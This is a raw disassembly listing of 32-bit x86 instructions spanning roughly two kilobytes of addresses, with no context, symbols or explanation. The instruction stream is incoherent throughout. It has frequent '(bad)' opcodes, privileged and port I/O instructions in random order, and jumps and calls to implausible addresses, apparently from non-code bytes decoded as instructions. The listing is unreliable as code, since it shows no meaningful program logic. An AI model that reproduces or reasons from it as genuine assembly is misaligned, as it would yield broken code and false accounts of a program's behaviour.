  412d89:	add    esp,edi
  412d8b:	je     0x412d13
  412d8d:	inc    edi
  412d8e:	sbb    eax,0x728b84a2
  412d93:	imul   BYTE PTR ds:0x3b5da9e1
  412d99:	inc    edx
  412d9a:	xchg   ebx,eax
  412d9b:	inc    BYTE PTR [edx-0x63]
  412d9e:	ret    0xde6
  412da1:	sbb    DWORD PTR [edi+ebx*1-0x2a],edx
  412da5:	xchg   esp,eax
  412da6:	mov    ch,0x52
  412da8:	sbb    esi,DWORD PTR [edi+0x428b06c5]
  412dae:	repnz setne BYTE PTR [edx]
  412db2:	jmp    0x412d71
  412db4:	ret    0x81d3
  412db7:	mov    dh,0xf2
  412db9:	(bad)  
  412dba:	stos   BYTE PTR es:[edi],al
  412dbb:	sub    BYTE PTR [eax-0x94ad164],0x9
  412dc2:	es addr16 xchg edx,eax
  412dc5:	repz adc BYTE PTR [edx-0x2796e211],ch
  412dcc:	cld    
  412dcd:	pop    edx
  412dce:	test   DWORD PTR [ebx],ebx
  412dd0:	inc    esi
  412dd1:	mov    al,0x85
  412dd3:	xchg   esi,eax
  412dd4:	ror    DWORD PTR [ebx],1
  412dd6:	mov    eax,ds:0x1aaf4529
  412ddb:	or     BYTE PTR [esi+0x105e120a],dl
  412de1:	pop    edx
  412de2:	(bad)  
  412de3:	cmp    al,0x2d
  412de5:	xchg   BYTE PTR [ebx+0x22c911d9],dh
  412deb:	add    al,0xa2
  412ded:	fld    QWORD PTR [esi-0x6ceb0d06]
  412df3:	jecxz  0x412e41
  412df5:	pusha  
  412df6:	xchg   ebp,eax
  412df7:	dec    ebx
  412df8:	mov    ds:0x6dce5899,al
  412dfd:	mov    es,ebp
  412dff:	clc    
  412e00:	shr    BYTE PTR [edx],cl
  412e02:	imul   ebx,DWORD PTR [ebx],0x3b4e316d
  412e08:	jl     0x412d8b
  412e0a:	ss fs aad 0x6e
  412e0e:	jbe    0x412e13
  412e10:	push   edi
  412e11:	push   cs
  412e12:	sbb    al,0x9b
  412e14:	cmp    BYTE PTR [ecx+0xd],cl
  412e17:	shl    BYTE PTR [edx],1
  412e19:	xchg   edi,eax
  412e1a:	ins    DWORD PTR es:[edi],dx
  412e1b:	cwde   
  412e1c:	jns    0x412dc9
  412e1e:	sahf   
  412e1f:	iret   
  412e20:	or     ebx,DWORD PTR [esi]
  412e22:	mov    cl,0x8b
  412e25:	mov    edi,0x61593ca
  412e2a:	sbb    ah,ah
  412e2c:	and    eax,0x988763b7
  412e31:	and    dh,dl
  412e33:	add    al,BYTE PTR [ebx+0x4425719a]
  412e39:	push   0x7b12cc0b
  412e3e:	mov    bh,0xca
  412e40:	xor    eax,DWORD PTR [ebp-0x5ae3dbab]
  412e46:	inc    ecx
  412e47:	das    
  412e48:	cmp    eax,0x83c46a4
  412e4d:	in     al,dx
  412e4e:	into   
  412e4f:	rol    DWORD PTR [edi+0x633274f1],cl
  412e55:	mov    dh,0x40
  412e57:	add    DWORD PTR [edi+edi*4],ebx
  412e5a:	sbb    eax,0x40f33072
  412e5f:	jns    0x412eba
  412e61:	sbb    al,0x70
  412e63:	mov    ebx,0xda63010a
  412e68:	and    cl,cl
  412e6a:	imul   ebx,DWORD PTR ds:0xa98b7f8b,0x59035413
  412e74:	dec    ebp
  412e75:	mov    ebx,0x9c188009
  412e7a:	out    dx,eax
  412e7b:	push   ebx
  412e7c:	push   eax
  412e7d:	leave  
  412e7e:	cs mov ecx,0x888a9024
  412e84:	pop    eax
  412e85:	mov    ebx,0x7c3ac6d9
  412e8a:	ret    0xec83
  412e8d:	adc    dh,BYTE PTR [eax+0x6c362168]
  412e93:	cmp    BYTE PTR [edi],dh
  412e95:	fiadd  WORD PTR [ebx]
  412e97:	cmp    ebx,edi
  412e99:	je     0x412eb6
  412e9b:	aas    
  412e9c:	repnz mov dh,0x53
  412e9f:	xchg   ecx,eax
  412ea0:	arpl   WORD PTR [edi-0x1c],sp
  412ea3:	adc    DWORD PTR ds:0xb89b9609,0xd75acc32
  412ead:	adc    edi,esi
  412eaf:	adc    DWORD PTR [esi],ebp
  412eb1:	mov    bl,0x2f
  412eb3:	mov    ds:0x48e110b3,eax
  412eb8:	sub    ebp,DWORD PTR [ecx+0x63]
  412ebb:	and    ebp,DWORD PTR [edx+0x29f82fc8]
  412ec1:	mov    ds:0x78701298,eax
  412ec6:	push   ecx
  412ec7:	add    edx,DWORD PTR [ebx-0x1b2b99cf]
  412ecd:	sti    
  412ece:	mov    al,ds:0x9fe4b361
  412ed3:	or     BYTE PTR [eax*2+0x1d331a88],bh
  412eda:	mov    ebp,0xfc610e64
  412edf:	inc    edi
  412ee0:	out    0x65,eax
  412ee2:	mov    ecx,DWORD PTR [ebp+edi*4-0x35]
  412ee6:	fistp  DWORD PTR [ebp-0x7e5c7de6]
  412eec:	dec    edi
  412eed:	xchg   edi,eax
  412eee:	div    BYTE PTR [ecx+ebx*8-0x66]
  412ef2:	add    ebx,DWORD PTR [edx-0x1668e346]
  412ef8:	jne    0x412f6c
  412efa:	(bad)  
  412efb:	and    DWORD PTR [esp+ecx*8-0x1d],esi
  412eff:	out    dx,al
  412f00:	repz je 0x412ec8
  412f03:	in     eax,0x47
  412f05:	inc    ebp
  412f06:	sysret 
  412f08:	out    dx,al
  412f09:	outs   dx,BYTE PTR ds:[esi]
  412f0a:	mov    ebx,0xad42733f
  412f0f:	mov    ah,BYTE PTR [edx+0x5eefa94d]
  412f15:	mov    ebx,0x20389918
  412f1a:	sbb    bh,BYTE PTR [edi+0x35]
  412f1d:	loopne 0x412f77
  412f1f:	ds dec ecx
  412f21:	jbe    0x412eef
  412f23:	inc    esp
  412f24:	(bad)  
  412f25:	imul   edx,DWORD PTR [esi-0x4fe043fa],0x6c4140ce
  412f2f:	ja     0x412eba
  412f31:	or     DWORD PTR [ecx],ebx
  412f33:	hlt    
  412f34:	int3   
  412f35:	repnz adc eax,0x392a5a6
  412f3b:	imul   edi,DWORD PTR [eax+0x5],0xfcab2fb8
  412f42:	aad    0x47
  412f44:	mov    ds:0x376e2ae9,al
  412f49:	push   0xdb624b6f
  412f4e:	mov    edx,es
  412f50:	or     ch,BYTE PTR gs:[edi]
  412f53:	cs mov eax,0x4f15366d
  412f59:	lock xor ecx,DWORD PTR [ebx+0x7db36f79]
  412f60:	jb     0x412fda
  412f62:	and    al,0xee
  412f64:	sub    eax,0xaa109f64
  412f69:	and    edi,DWORD PTR [edx+eiz*2+0x1c]
  412f6d:	daa    
  412f6e:	or     edi,DWORD PTR [ecx-0x3e]
  412f71:	add    DWORD PTR [ecx-0x6f188705],edi
  412f77:	xor    cl,BYTE PTR [eax]
  412f79:	mov    ebp,0x64302c97
  412f7e:	das    
  412f7f:	loop   0x412f23
  412f81:	pusha  
  412f82:	outs   dx,BYTE PTR ds:[esi]
  412f83:	sbb    ah,BYTE PTR [ebp-0xecf1fbf]
  412f89:	out    0x8e,al
  412f8b:	imul   edi,DWORD PTR [esi-0x6a],0xa181c84f
  412f92:	add    eax,0xea84c78d
  412f97:	and    ch,dh
  412f99:	jno    0x412fc4
  412f9b:	mov    dh,0xbc
  412f9d:	stos   DWORD PTR es:[edi],eax
  412f9e:	int3   
  412f9f:	aam    0x45
  412fa1:	jle    0x412ffb
  412fa3:	outs   dx,BYTE PTR ds:[esi]
  412fa4:	outs   dx,DWORD PTR ds:[esi]
  412fa5:	rcl    DWORD PTR [edx+ecx*2],1
  412fa8:	imul   eax
  412faa:	lods   eax,DWORD PTR ds:[esi]
  412fab:	xor    edi,DWORD PTR [edx+0x6]
  412fae:	xor    DWORD PTR [ebx+eax*2-0xf],ecx
  412fb2:	add    al,ah
  412fb4:	call   DWORD PTR [ebx+ebx*4+0xd]
  412fb8:	add    DWORD PTR [edx],ecx
  412fba:	pop    ebp
  412fbb:	dec    edi
  412fbc:	jnp    0x412f80
  412fbe:	dec    edi
  412fbf:	xor    DWORD PTR [esi-0x698d0c64],esp
  412fc5:	mov    ebp,esi
  412fc7:	daa    
  412fc8:	pushf  
  412fc9:	xchg   ebp,eax
  412fca:	pop    ss
  412fcb:	xchg   edi,eax
  412fcc:	nop
  412fcd:	push   ss
  412fce:	iret   
  412fcf:	(bad)  
  412fd0:	jg     0x41304b
  412fd2:	imul   esi,DWORD PTR [esi],0xffffffef
  412fd5:	call   0x908df026
  412fda:	cmp    ah,BYTE PTR ds:0x8b30f175
  412fe0:	jae    0x412fa6
  412fe2:	adc    DWORD PTR [eax-0x46],esi
  412fe5:	cmp    ecx,DWORD PTR [eax-0x638816ed]
  412feb:	inc    ecx
  412fec:	mov    edx,0x15bf4cf4
  412ff1:	arpl   WORD PTR [ecx],si
  412ff3:	gs jmp 0xa585472b
  412ff9:	add    DWORD PTR [edi+0x57],ecx
  412ffc:	popf   
  412ffd:	dec    edx
  412ffe:	std    
  412fff:	gs pop ecx
  413001:	pop    edx
  413002:	mov    DWORD PTR [edi+ebx*2+0x2bd75f67],0xfedc5230
  41300d:	mov    ss:0x70c39710,eax
  413013:	push   edx
  413014:	loop   0x413058
  413016:	mov    ebx,0xc0954155
  41301b:	sar    BYTE PTR [ecx-0x704e4925],0x95
  413022:	in     al,dx
  413023:	leave  
  413024:	rcl    DWORD PTR ds:0x32a1915d,0xb
  41302b:	mov    eax,0x3ebd5468
  413030:	mov    ds:0x95ed723b,al
  413035:	or     eax,0x5b61960f
  41303a:	retf   
  41303b:	stos   DWORD PTR es:[edi],eax
  41303c:	addr16 daa 
  41303e:	mov    eax,ds:0xf65e1496
  413043:	inc    esi
  413044:	push   eax
  413045:	jb     0x412ffa
  413047:	mov    al,ds:0xce86e06f
  41304c:	into   
  41304d:	aaa    
  41304e:	rcl    DWORD PTR [ebx+0x72751196],cl
  413054:	push   0x43
  413056:	ins    BYTE PTR es:[edi],dx
  413057:	in     eax,dx
  413058:	sbb    al,0x9f
  41305a:	int    0x8f
  41305c:	jmp    DWORD PTR [eax+0x40]
  41305f:	sahf   
  413060:	imul   ebp,DWORD PTR [ebx-0x4d],0x41bf801d
  413067:	cmc    
  413068:	jmp    0x9dfc:0x411ad6c4
  41306f:	pop    ecx
  413070:	neg    dl
  413072:	in     al,0x4d
  413074:	das    
  413075:	ror    BYTE PTR [ecx-0x481e47be],1
  41307b:	stos   BYTE PTR es:[edi],al
  41307c:	sbb    al,0x46
  41307e:	sbb    DWORD PTR [eax],esp
  413080:	adc    al,0x22
  413082:	ss mov bl,0xf9
  413085:	gs addr16 inc edx
  413088:	or     ecx,DWORD PTR [ebx]
  41308a:	pushf  
  41308b:	out    0x84,eax
  41308d:	adc    BYTE PTR [eax+0xcd531c4],al
  413093:	jnp    0x413020
  413095:	mov    ebp,0x4b085109
  41309a:	sub    DWORD PTR ds:0xb1f79d8a,0x715fc7f7
  4130a4:	out    0x4,eax
  4130a6:	in     eax,0xd7
  4130a8:	jp     0x4130c9
  4130aa:	push   es
  4130ab:	lock mov dl,0x2b
  4130ae:	xor    ah,bl
  4130b0:	shr    BYTE PTR [esi-0x33d63082],cl
  4130b6:	ins    BYTE PTR es:[edi],dx
  4130b7:	xchg   ebp,eax
  4130b8:	data16 cmp bh,BYTE PTR [eax-0x32f90afe]
  4130bf:	ins    BYTE PTR es:[edi],dx
  4130c0:	fs mov edi,0xe6fd4a65
  4130c6:	ja     0x413136
  4130c8:	mov    esi,0xc1b3fd01
  4130cd:	or     BYTE PTR [esi-0x13],ah
  4130d0:	push   edx
  4130d1:	ss aaa 
  4130d3:	inc    edi
  4130d4:	push   es
  4130d5:	pop    ds
  4130d6:	data16 es jg 0x413137
  4130da:	and    DWORD PTR [ecx-0x6dd5bbb0],0x62a5f4f
  4130e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130e5:	fiadd  WORD PTR ds:0x30b3afa7
  4130eb:	add    al,0x51
  4130ed:	test   BYTE PTR [edi+0x44f084c4],al
  4130f3:	xor    DWORD PTR [eax],edi
  4130f5:	add    eax,0x2298128d
  4130fa:	push   edi
  4130fb:	lds    esp,FWORD PTR [edx]
  4130fd:	gs push edi
  4130ff:	pop    eax
  413100:	pushf  
  413101:	fsub   QWORD PTR [edi+0x15f1878d]
  413107:	dec    edx
  413108:	test   eax,0x32a38791
  41310d:	rol    DWORD PTR [ebx+0x56],0x7e
  413111:	cdq    
  413112:	int    0x25
  413114:	add    eax,0xf7e7ea4f
  413119:	pop    es
  41311a:	mov    bl,0x2f
  41311c:	dec    ebp
  41311d:	sub    al,0xaa
  41311f:	sti    
  413120:	rcr    DWORD PTR [edi],0x30
  413123:	mul    BYTE PTR [esi+0x15]
  413126:	mov    ecx,0x8bf9117a
  41312b:	mov    cl,0x92
  41312d:	(bad)  
  41312e:	dec    ebx
  41312f:	ds jae 0x3559ecca
  413136:	out    0x53,al
  413138:	ds sub al,0x61
  41313b:	repz mov ebp,0xcef8f39c
  413141:	jp     0x41318e
  413143:	mov    ah,0xa0
  413145:	(bad)  
  413146:	sub    DWORD PTR [ebx],ecx
  413148:	inc    edi
  413149:	das    
  41314a:	ss jb  0x41317c
  41314d:	mov    DWORD PTR [eax+ecx*4],eax
  413150:	jnp    0x41317b
  413152:	xchg   ecx,eax
  413153:	lds    esi,FWORD PTR [eax+0x76deba69]
  413159:	lds    ebp,FWORD PTR [ecx+0x14]
  41315c:	pushf  
  41315d:	dec    eax
  41315e:	push   esi
  41315f:	loope  0x41313c
  413161:	sbb    cl,BYTE PTR [ecx-0x49]
  413164:	arpl   WORD PTR [edi-0x34fb2ede],si
  41316a:	leave  
  41316b:	mov    eax,ds:0xbb878e77
  413170:	cli    
  413171:	out    dx,al
  413172:	xor    BYTE PTR [esi-0x1003a742],dl
  413178:	pop    ecx
  413179:	xlat   BYTE PTR ds:[ebx]
  41317a:	stos   BYTE PTR es:[edi],al
  41317b:	jbe    0x413191
  41317d:	jne    0x413136
  41317f:	pop    ds
  413180:	cs sahf 
  413182:	xor    ecx,esi
  413184:	mov    edi,0xfc2c3b2e
  413189:	addr16 cmc 
  41318b:	mov    WORD PTR ds:[ebx-0x10],?
  41318f:	call   0xe223bb3a
  413194:	(bad)  [eax-0x1a]
  413197:	ror    DWORD PTR [ecx+ebp*2+0x31be0f85],0xc5
  41319f:	sahf   
  4131a0:	fdivr  DWORD PTR [ecx]
  4131a2:	mov    bl,0xb
  4131a4:	mov    ?,WORD PTR [esi]
  4131a6:	adc    eax,0xcda57f37
  4131ab:	mov    dh,0x34
  4131ad:	das    
  4131ae:	stc    
  4131af:	jle    0x413185
  4131b1:	inc    ebx
  4131b2:	dec    esp
  4131b3:	dec    edx
  4131b4:	imul   BYTE PTR [edx-0x6]
  4131b7:	sbb    BYTE PTR [edi+0x6e77ec79],ah
  4131bd:	(bad)  
  4131be:	(bad)  
  4131bf:	push   eax
  4131c0:	stos   BYTE PTR es:[edi],al
  4131c1:	adc    al,0x13
  4131c3:	jmp    0x9de69ee5
  4131c8:	out    0xc6,eax
  4131ca:	adc    BYTE PTR [edi+ebx*8-0x65661f97],bh
  4131d1:	sub    eax,eax
  4131d3:	test   ah,ah
  4131d5:	mov    edi,0x58191c76
  4131da:	mov    ds:0x7d218ae1,al
  4131df:	inc    eax
  4131e0:	mov    edx,0x8273de74
  4131e5:	into   
  4131e6:	mov    bh,BYTE PTR [esi+0x68]
  4131e9:	push   cs
  4131ea:	outs   dx,DWORD PTR ds:[esi]
  4131eb:	ret    
  4131ec:	xor    al,0x14
  4131ee:	mov    al,ds:0xf0830f4c
  4131f3:	popa   
  4131f4:	(bad)  
  4131f5:	push   cs
  4131f6:	das    
  4131f7:	jbe    0x4131e2
  4131f9:	jmp    0x41326c
  4131fb:	jge    0x413241
  4131fd:	bound  edx,QWORD PTR [ebp+0x4d998e32]
  413203:	sbb    bl,BYTE PTR fs:[eax+ebx*8+0x25]
  413208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413209:	mov    ds:0x3c4bff77,al
  41320e:	adc    BYTE PTR [edx+edx*4-0x51a55b43],0x4a
  413216:	mov    edx,0x3a5b8f9
  41321b:	retf   
  41321c:	mov    eax,ds:0xaaa33512
  413221:	aad    0x50
  413223:	adc    DWORD PTR [edi+0x10],ebx
  413226:	mov    esp,0x725f8ddc
  41322b:	pop    edi
  41322c:	icebp  
  41322d:	inc    BYTE PTR [eax-0x4faac053]
  413233:	inc    ebx
  413234:	shl    ah,0x1e
  413237:	loope  0x413258
  413239:	xlat   BYTE PTR ds:[ebx]
  41323a:	pop    ecx
  41323b:	and    ecx,0xffffff85
  41323e:	push   eax
  41323f:	mov    ebx,0x33ce2b51
  413244:	mov    WORD PTR [eax-0x30a85ba6],es
  41324a:	lods   eax,DWORD PTR ds:[esi]
  41324b:	fsubr  st,st(2)
  41324d:	ja     0x4132af
  41324f:	ins    DWORD PTR es:[edi],dx
  413250:	sbb    al,0x2e
  413252:	jae    0x413259
  413254:	imul   edi,DWORD PTR [edx-0x79c1301a],0xfacf408
  41325e:	sub    ebx,DWORD PTR [ebx]
  413260:	jnp    0x413290
  413262:	pop    ebp
  413263:	push   0xbcc00b77
  413268:	add    ch,BYTE PTR [edi+ebp*4+0x1cfbad19]
  41326f:	retf   0x954b
  413272:	leave  
  413273:	xchg   al,ah
  413275:	sub    eax,0x2d62eecf
  41327a:	fidiv  DWORD PTR [ecx+0x4c047870]
  413280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413281:	pop    ss
  413282:	adc    edx,DWORD PTR [ecx+0x7e312445]
  413288:	out    0xf8,eax
  41328a:	xchg   DWORD PTR [ebx+edx*2],edi
  41328d:	mov    edi,DWORD PTR [edx+0x6b]
  413290:	stc    
  413291:	lahf   
  413292:	or     al,0x52
  413294:	inc    eax
  413295:	lahf   
  413296:	dec    ebx
  413297:	out    0xcf,eax
  413299:	mov    cl,0x6
  41329b:	retf   
  41329c:	sahf   
  41329d:	push   eax
  41329e:	sub    al,0x6e
  4132a0:	pop    ebp
  4132a1:	and    al,0x83
  4132a3:	ds aad 0x7d
  4132a6:	mov    ecx,0xa3c35b71
  4132ab:	inc    eax
  4132ac:	and    eax,0x4a8ae1e7
  4132b1:	xor    eax,0x2425dfe8
  4132b6:	xchg   esi,eax
  4132b7:	xchg   edx,eax
  4132b8:	sub    dh,BYTE PTR [esi-0x16d7b0bf]
  4132be:	cmp    DWORD PTR [edx],eax
  4132c0:	repnz scas eax,DWORD PTR es:[edi]
  4132c2:	addr16 push esp
  4132c4:	or     esp,DWORD PTR [esp+esi*1]
  4132c7:	sbb    DWORD PTR [ecx+edi*4],esp
  4132ca:	mov    ah,0x8e
  4132cc:	(bad)  
  4132cd:	mov    edi,0x9635c40d
  4132d2:	fistp  QWORD PTR [esi+0x44]
  4132d5:	ja     0x413352
  4132d7:	into   
  4132d8:	popa   
  4132d9:	pop    ss
  4132da:	and    dh,BYTE PTR [ebx]
  4132dc:	repnz mov bh,0xc1
  4132df:	leave  
  4132e0:	cmp    al,0xcd
  4132e2:	mov    ah,0xb
  4132e4:	pop    ds
  4132e5:	aas    
  4132e6:	fnstenv [edx-0x3c7b8edc]
  4132ec:	lea    edi,[esi+ebp*2-0x14e10353]
  4132f3:	lea    ecx,[edi+0x78]
  4132f6:	iret   
  4132f7:	jne    0x41329f
  4132f9:	in     eax,dx
  4132fa:	std    
  4132fb:	xor    eax,0x20833039
  413300:	xor    eax,0xa191463f
  413305:	(bad)  
  413306:	stc    
  413307:	imul   ecx,DWORD PTR [edx+0x376b4d0f],0x2a558ad0
  413311:	std    
  413312:	ds push ecx
  413314:	out    dx,al
  413315:	sub    eax,0xd44e698a
  41331a:	and    BYTE PTR [edx+0xa],bl
  41331d:	inc    ebx
  41331e:	cmp    eax,0x4b004951
  413323:	mov    WORD PTR [ebp+0x1],es
  413326:	sar    BYTE PTR [edi+0x6d607d67],0xac
  41332d:	xchg   edx,eax
  41332e:	jne    0x4132c9
  413330:	rcr    DWORD PTR [esi-0x49],0xd8
  413334:	push   ss
  413335:	push   cs
  413336:	out    0x3e,eax
  413338:	ja     0x413383
  41333a:	fnstsw WORD PTR [edx-0x5ae2ef90]
  413340:	inc    ecx
  413341:	jnp    0x4132d9
  413343:	jmp    0x413383
  413345:	cli    
  413346:	hlt    
  413347:	push   cs
  413348:	les    ecx,FWORD PTR [ecx]
  41334a:	inc    ebx
  41334b:	pushf  
  41334c:	sub    BYTE PTR [edi+eax*4],cl
  41334f:	and    edx,DWORD PTR [ebp+0x6a4f4fc1]
  413355:	and    ch,BYTE PTR [edi+0x2a]
  413358:	push   esp
  413359:	cs nop
  41335b:	sbb    ebp,edx
  41335d:	inc    edx
  41335e:	retf   0x2d3e
  413361:	lods   al,BYTE PTR ds:[esi]
  413362:	or     eax,0x55cff0ff
  413367:	les    eax,FWORD PTR [ebx+0x72416c2]
  41336d:	sub    eax,0x4c77d274
  413372:	push   edi
  413373:	stos   DWORD PTR es:[edi],eax
  413374:	or     ebp,DWORD PTR [ebp+edx*4-0x6b]
  413378:	fisttp DWORD PTR [eax+edx*1-0x60]
  41337c:	jo     0x4133a4
  41337e:	dec    ecx
  41337f:	out    0xe6,al
  413381:	(bad)  
  413383:	or     cl,BYTE PTR [ecx]
  413385:	out    dx,al
  413386:	xchg   edx,eax
  413387:	call   0x8d4ca12f
  41338c:	rol    ah,1
  41338e:	cli    
  41338f:	inc    ebx
  413390:	je     0x413322
  413392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413393:	bound  ebx,QWORD PTR [eax+0x2796f84e]
  413399:	loopne 0x4133f0
  41339b:	mov    dl,0xf5
  41339d:	and    al,0x42
  41339f:	fimul  DWORD PTR [edi+eax*1-0x6]
  4133a3:	mov    ebx,0x52f23a6a
  4133a8:	mov    ecx,DWORD PTR [ebx-0x7bd29759]
  4133ae:	jns    0x413385
  4133b0:	adc    dh,cl
  4133b2:	inc    edx
  4133b3:	pop    edi
  4133b4:	fistp  DWORD PTR [edi+0x325199c4]
  4133ba:	xor    ebx,ebp
  4133bc:	gs mov ebx,0x4338e27e
  4133c2:	mov    esi,edx
  4133c4:	pop    ecx
  4133c5:	cmovp  ebp,DWORD PTR [edi+0x797a8aeb]
  4133cc:	bound  ebx,QWORD PTR ds:0xafaed766
  4133d2:	jp     0x41339e
  4133d4:	call   0x15fcc435
  4133d9:	or     ebp,esi
  4133db:	mov    ss,ebx
  4133dd:	mov    edx,0xce7a5031
  4133e2:	xchg   ebp,eax
  4133e3:	mov    eax,ds:0x63c7a23
  4133e8:	push   ecx
  4133e9:	mov    bl,0x45
  4133eb:	ins    BYTE PTR es:[edi],dx
  4133ec:	xor    bh,BYTE PTR [edx-0x1131d17d]
  4133f2:	push   0x42
  4133f4:	xor    dl,BYTE PTR [edi]
  4133f6:	arpl   WORD PTR [ecx-0x47],bp
  4133f9:	dec    edx
  4133fa:	fmul   DWORD PTR [ebp+0x35af621d]
  413400:	ja     0x41343a
  413402:	jl     0x4133f4
  413404:	and    cl,ah
  413406:	jle    0x413422
  413408:	test   DWORD PTR [ebp-0x60],0x84db7607
  41340f:	add    dl,dh
  413411:	cmp    ah,BYTE PTR [edx]
  413413:	xor    esi,DWORD PTR [ecx-0x45]
  413416:	cmp    BYTE PTR [ebx],dh
  413418:	adc    al,0xab
  41341a:	call   0xbfc1da8a
  41341f:	test   al,0xf8
  413421:	mov    cs,WORD PTR [edi-0x53]
  413424:	pushf  
  413425:	mov    eax,0xfd89b33a
  41342a:	lods   eax,DWORD PTR ds:[esi]
  41342b:	mov    WORD PTR [ecx+esi*2-0x71],cs
  41342f:	lahf   
  413430:	push   0x60ec2521
  413435:	ins    DWORD PTR es:[edi],dx
  413436:	je     0x41345d
  413438:	loopne 0x413430
  41343a:	fisubr DWORD PTR [ebp+0x12]
  41343d:	outs   dx,BYTE PTR ds:[esi]
  41343e:	xor    ah,BYTE PTR [edx+ebp*8-0x241d83cd]
  413445:	xchg   DWORD PTR [ecx*1+0x2cb94fdb],esp
  41344c:	scas   eax,DWORD PTR es:[edi]
  41344d:	fnstenv [edx-0x9bc8ec]
  413453:	aad    0xb3
  413455:	ds aaa 
  413457:	or     esp,DWORD PTR [edi+0x17]
  41345a:	add    eax,0x6bf1245b
  41345f:	addr16 cmp eax,0xd470ecc5
  413465:	mov    eax,ds:0x8e132018
  41346a:	cmp    eax,0x2e8f583e
  41346f:	aas    
  413470:	and    DWORD PTR [ecx+edi*1-0x73],0xb37d04b9
  413478:	add    al,0xf5
  41347a:	inc    sp
  41347c:	stos   DWORD PTR es:[edi],eax
  41347d:	or     ebx,DWORD PTR [ecx-0x75d50621]
  413483:	shl    BYTE PTR [ebx+0x53],0x35
  413487:	pop    ebp
  413488:	test   al,0xd0
  41348a:	and    edi,DWORD PTR [ebp+0x53153a0b]
  413490:	mov    BYTE PTR [ecx-0x7b51c649],dl
  413496:	xor    eax,0xcc02bf8f
  41349b:	loopne 0x413488
  41349d:	xchg   esp,eax
  41349e:	int3   
  41349f:	mov    eax,ss:0xda25145c
  4134a5:	cmp    ch,BYTE PTR [esi+0x51]
  4134a8:	ja     0x413459
  4134aa:	mov    ecx,0x4b11f899
  4134af:	in     al,0x69
  4134b1:	iret   
  4134b2:	mov    eax,ds:0xa8c0f68e
  4134b7:	fdiv   DWORD PTR [eax-0xbda555]
  4134bd:	test   DWORD PTR [eax],ebx
  4134bf:	sar    DWORD PTR [eax+0x1c],1
  4134c2:	xor    BYTE PTR [ebx-0x64b92110],0xc5
  4134c9:	dec    eax
  4134ca:	pushf  
  4134cb:	js     0x413455
  4134cd:	cmp    al,0x3c
  4134cf:	mov    BYTE PTR [edx+0x22935040],dh
  4134d5:	add    esp,DWORD PTR [ecx*1-0x299e110c]
  4134dc:	adc    eax,0xbb90583d
  4134e1:	xor    al,0x71
  4134e3:	icebp  
  4134e4:	sub    ebp,DWORD PTR [ebx+edi*8-0x52]
  4134e8:	jb     0x413562
  4134ea:	mov    gs,WORD PTR [edx-0x48b28002]
  4134f0:	mov    gs,WORD PTR [ebx]
  4134f2:	cmp    eax,ecx
  4134f4:	jmp    0xe1f5:0xbb693dd9
  4134fb:	call   0x76dc26dc
  413500:	mov    bl,0xf8
  413502:	pop    eax
  413503:	out    dx,al
  413504:	call   0x25a20fbf
  413509:	int3   
  41350a:	sub    eax,esp
  41350c:	cmp    ecx,esi
  41350e:	cmp    dh,bl
  413510:	adc    dh,BYTE PTR [edx-0x73]
  413513:	mov    ah,0xe7
  413515:	(bad)  
  413516:	rol    al,cl
  413518:	or     BYTE PTR [edx-0x13e669bb],al
  41351e:	lods   eax,DWORD PTR ds:[esi]
  41351f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413520:	sbb    BYTE PTR [ecx],cl
  413522:	xor    BYTE PTR [di+0x62],al
  413526:	push   ecx
  413527:	hlt    
  413528:	jecxz  0x413586
  41352a:	stos   BYTE PTR es:[edi],al
  41352b:	lods   al,BYTE PTR ds:[esi]
  41352c:	adc    al,BYTE PTR [edx-0x4984b8a6]
  413532:	adc    eax,0x69961f00
  413537:	cmp    BYTE PTR [ecx],ch
  413539:	pop    ebx
  41353a:	and    eax,0x77e0093a
  41353f:	xchg   ecx,eax
  413540:	pop    esi
  413541:	pop    ds
  413542:	loopne 0x413519
  413544:	out    0x73,eax
  413546:	jb     0x41357d
  413548:	mov    bl,bl
  41354a:	mov    eax,ds:0x444024e7
  41354f:	cmp    bh,0xfb
  413552:	sub    cl,ch
  413554:	loopne 0x4134fd
  413556:	mov    ah,0xbb
  413558:	popa   
  413559:	sbb    BYTE PTR [edx+0x304999ec],ah
  41355f:	retf   
  413560:	dec    esp
  413561:	sar    BYTE PTR fs:[ebx],1
  413564:	mov    ds:0x218d0c1a,al
  413569:	dec    ebp
  41356a:	add    DWORD PTR [ebx],eax
  41356c:	stc    
  41356d:	mov    ds:0x369c77c1,al
  413572:	popa   
  413573:	cs bnd ret 0x88f0
  413578:	daa    
  413579:	les    edi,FWORD PTR [edx-0x32f8f5b8]
  41357f:	push   0xec6bcdd9
  413584:	sbb    ch,BYTE PTR [edx-0x76]
  413587:	push   0xffffffa2
  413589:	push   edx
  41358a:	xchg   eax,edi
  41358c:	or     ch,ch
  41358e:	push   edi
  41358f:	mov    esi,0x3f0c9366
  413594:	or     BYTE PTR [esi+0x2c1f7dde],bh
  41359a:	inc    esi
  41359b:	dec    ecx
  41359c:	aaa    
  41359d:	ret    0x2dde
  4135a0:	outs   dx,BYTE PTR ds:[esi]
  4135a1:	xchg   edi,eax
  4135a2:	lock xor BYTE PTR [ebx-0x1b],ch
  4135a6:	push   ebx
  4135a7:	jbe    0x4135e7
  4135a9:	bound  edi,QWORD PTR [eax+0x4b5e317a]
  4135af:	ret    0xa51c
  4135b2:	sar    DWORD PTR [esi+0x3f29de3d],0xd2
  4135b9:	pop    edx
  4135ba:	ficomp DWORD PTR [esi]
  4135bc:	pop    ss
  4135bd:	xor    al,0x5b
  4135bf:	popa   
  4135c0:	cmp    BYTE PTR [edi-0x4a],dh
  4135c3:	ret    
  4135c4:	repnz fist DWORD PTR [ecx+0x243f62d3]
  4135cb:	xchg   esp,eax
  4135cc:	ss inc esi
  4135ce:	mov    bh,0x2d
  4135d0:	addr16 daa 
  4135d2:	xchg   ecx,eax
  4135d3:	pop    ebx
  4135d4:	pop    es
  4135d5:	test   ch,bl
  4135d7:	imul   DWORD PTR [eax+0x30]
  4135da:	xor    BYTE PTR [eax+0x5aa2f9ff],bl
  4135e0:	(bad)  
  4135e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135e2:	nop
  4135e3:	retf   
  4135e4:	ds pusha 
  4135e6:	dec    ebx
  4135e7:	inc    eax
  4135e8:	popf   
  4135e9:	aas    
  4135ea:	push   esp
  4135eb:	xchg   DWORD PTR [edx+0x181cb470],ebx
